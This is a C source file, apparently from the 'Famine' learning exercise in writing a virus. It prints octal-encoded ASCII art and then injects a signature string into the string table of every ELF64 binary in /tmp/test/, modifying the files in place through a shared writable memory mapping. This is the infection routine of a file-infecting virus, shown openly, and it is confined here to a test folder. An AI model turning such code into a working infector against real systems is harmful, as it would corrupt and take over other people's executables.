#include "../inc/famine.h"

void print_famine(int argc, char **argv)
{
    char famine[] = {012, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 057, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 057, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 040, 040, 040, 057, 047, 040, 056, 054, 054, 054, 054, 040, 040, 056, 057, 040, 040, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 040, 040, 057, 047, 073, 047, 040, 040, 040, 040, 040, 054, 057, 040, 040, 040, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 040, 057, 040, 057, 040, 040, 040, 054, 054, 057, 057, 054, 0140, 047, 0140, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 050, 040, 054, 054, 040, 047, 0137, 054, 040, 040, 054, 054, 054, 047, 040, 0140, 0140, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 0174, 040, 040, 040, 040, 057, 0100, 040, 040, 054, 054, 054, 040, 073, 042, 040, 0140, 040, 040, 040, 012, 040, 040, 040, 040, 040, 057, 040, 040, 040, 040, 056, 040, 040, 040, 054, 047, 047, 057, 047, 040, 0140, 054, 0140, 0140, 040, 040, 040, 012, 040, 040, 040, 040, 057, 040, 040, 040, 056, 040, 040, 040, 040, 040, 056, 057, 054, 040, 0140, 054, 054, 040, 0140, 040, 073, 040, 012, 040, 054, 056, 057, 040, 040, 056, 040, 040, 040, 054, 055, 054, 047, 054, 0140, 040, 054, 054, 057, 047, 047, 0134, 054, 047, 040, 012, 0174, 040, 040, 040, 057, 073, 040, 056, 057, 054, 054, 047, 0140, 054, 054, 047, 047, 040, 0174, 040, 040, 040, 0174, 040, 040, 040, 012, 0174, 040, 040, 040, 040, 040, 057, 040, 040, 040, 047, 054, 047, 040, 040, 040, 040, 057, 040, 040, 040, 040, 0174, 040, 040, 040, 012, 040, 0134, 0137, 0137, 0137, 057, 047, 040, 040, 040, 047, 040, 040, 040, 040, 040, 0174, 040, 040, 040, 040, 040, 0174, 040, 040, 012, 040, 040, 0140, 054, 054, 047, 040, 040, 040, 0174, 040, 040, 040, 040, 040, 040, 057, 040, 040, 040, 040, 040, 0140, 0134, 040, 040, 012, 040, 040, 040, 040, 040, 040, 040, 040, 057, 040, 040, 040, 040, 040, 040, 0174, 040, 040, 040, 040, 040, 040, 040, 040, 0176, 0134, 040, 040, 012, 040, 040, 040, 040, 040, 040, 040, 047, 040, 040, 040, 040, 040, 040, 040, 050, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 072, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 040, 073, 040, 056, 040, 040, 040, 040, 040, 040, 040, 040, 040, 0134, 040, 040, 040, 040, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 072, 040, 040, 040, 0134, 040, 040, 040, 040, 040, 040, 040, 040, 040, 073, 040, 040, 040, 040, 040, 040, 040, 012, 040, 040, 040, 040, 040, 040, 040, 056, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 040, 00};
       
    debug("%s\n", famine);
    if (argc == 2 && ft_strcmp(argv[1], "--help") == 0)
    {
    }
}

/**
 * @brief injects a string in the strtab on an ELF64 file
 * 
 * @param fd previously opened file descriptor
 * @return int  if success, a negative value if error
 */
int famine(int fd)
{
    struct stat s;
    void *mem = NULL;

    
    if (fstat(fd, &s) < 0|| (size_t)s.st_size <= sizeof(Elf64_Ehdr))
        return (-1);
    mem = mmap(mem, s.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
    if (mem == MAP_FAILED)
    {
        debug("fd %i: %s", fd, "map failed");
        return (-1);
    }
    if (is_elf_64(mem, s.st_size))
        add_str_to_strtab(FAMINE, fd, mem, s.st_size);
    munmap(mem, s.st_size);
    return 0;
}

int main(int argc, char **argv)
{
    print_famine(argc, argv);
    handle_folder("/tmp/test/", famine, 0644);
    // handle_folder("/tmp/test2", 0&ft_puts);
}